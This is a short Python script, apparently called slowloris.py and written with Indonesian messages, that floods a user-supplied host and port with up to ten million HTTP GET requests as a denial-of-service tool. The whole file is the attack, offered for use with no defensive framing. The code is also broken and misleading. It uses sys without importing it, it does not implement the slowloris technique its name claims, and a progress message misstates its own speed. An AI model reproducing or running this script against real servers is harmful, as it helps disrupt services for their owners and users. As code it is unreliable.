import requests
import time

def main(target, port):
    if len(sys.argv) != 3:
        print("Penggunaan: python slowloris.py <target> <port>")
        sys.exit(1)

    start_time = time.time()
    for i in range(10000000):
        try:
            response = requests.get(f"http://{target}:{port}")
            if response.status_code == 200:
                print(f"Request Berhasil: {i+1} dari 10,000,000")
            else:
                print(f"Request Gagal: {i+1} dari 10,000,000")
        except Exception as e:
            print(f"Request Belum Dikirim: {i+1} dari 10,000,000")
        if (i+1) % 1000 == 0:
            print(f"Terupdate {i+1} dari 10,000,000 dalam 1 detik")
        time.sleep(0.1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Penggunaan: python slowloris.py <target> <port>")
        sys.exit(1)
    main(sys.argv[1], int(sys.argv[2]))
